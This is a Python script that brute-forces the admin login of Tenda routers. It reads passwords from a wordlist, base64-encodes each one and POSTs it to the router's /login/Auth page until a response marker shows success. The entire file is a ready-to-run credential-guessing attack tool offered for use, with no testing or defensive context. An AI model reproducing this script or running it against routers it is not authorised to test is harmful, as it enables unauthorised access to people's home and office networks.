#/usr/bin/python

'''
    BruteForce TENDA ROUTE's password
'''

import requests
import base64
import sys
import time

#url = 'http://192.168.254.1/login/Auth'

'''
headers = {
            #'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0',
            #'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            #'Accept-Language':'en-US,en;q=0.5',
            #'Accept-Encoding':'gzip, deflate',
            #'Content-Type': 'application/x-www-form-urlencoded',
            #'Origin': 'http://192.168.254.1',
            #'Connection':'keep-alive',
            #'Referer':'http://192.168.254.1/login.html',
            #'Cookie': 'bLanguage=en',
            #'Upgrade-Insecure-Request': '1'
             }
'''

#payload = {'password':'base64password'}
#r = requests.post(url, data=payload, headers=headers)

def brute_tenda():
    start_time = time.time()

    #target_IP ='http://' + sys.argv[1] + '/login/Auth'
    url = 'http://' + sys.argv[1] + '/login/Auth'
    passfile = sys.argv[2]

    try:
        r = requests.get(url,timeout=3)
        if r.status_code == 200:
            print('[+]Connected taget: %s' % r.url)
    except requests.exceptions.RequestException as e:
        print(str(e))
        sys.exit()


    try:
        with open(passfile,'rb') as f:
            for passwd in f:
                passwd = passwd.strip()  #!!!!!
                print('\033[1;31m[!]\033[0m CheckingPasscode: %s\t==>\t' % passwd.decode(),end='')

                #base = base64.urlsafe_b64encode(passwd)
                base = base64.b64encode(passwd)

                #Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=

                payload = {'password':base}
                #payload = {'Authorization':'Basic '+base.decode()}
                print('%s' % (base.decode()))
                r = requests.post(url, data=payload)

                if 'weibo' in r.text:
                    #print(r.request.headers)
                    print('\n[*]JUMP  URI:', r.url,end='')
                    print('\n[+]KEY FOUND:\033[1;33m %s\033[0m' % passwd.decode())
                    break
            else:
                print('\n[*]Password not found!')
    except FileNotFoundError:
        print('[!]PASSFILE not found!')
        sys.exit()

    end_time = time.time() - start_time
    print('Est time: %.2f' % end_time)

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print('Usage:%s IP PASSFILE' % sys.argv[0])
        sys.exit()

    brute_tenda()

